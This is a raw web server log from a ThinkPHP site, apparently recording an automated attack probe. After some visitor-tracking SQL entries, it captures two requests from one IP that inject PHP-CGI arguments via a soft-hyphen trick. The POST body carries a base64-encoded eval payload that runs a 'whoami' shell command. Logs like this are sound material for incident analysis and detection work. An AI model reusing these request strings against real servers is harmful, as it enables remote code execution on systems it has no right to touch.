[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.038262s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.036755s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '94.156.177.142' ORDER BY `Id` DESC LIMIT 1 [ RunTime:2.550732s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000531s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '94.156.177.142' [ RunTime:0.006957s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('94.156.177.142' , 1 , '2024-08' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-08-31 23:00:04' , 1 , 'æ™®é€šç½‘å‹') [ RunTime:0.000989s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '94.156.177.142'  AND `ucookie` IS NULL [ RunTime:0.006587s ]
---------------------------------------------------------------
[ 2024-08-31T23:49:14+08:00 ] 5.181.86.85 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.715819s] [åžåçŽ‡ï¼š1.40req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T23:49:16+08:00 ] 5.181.86.85 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015522s] [åžåçŽ‡ï¼š64.42req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
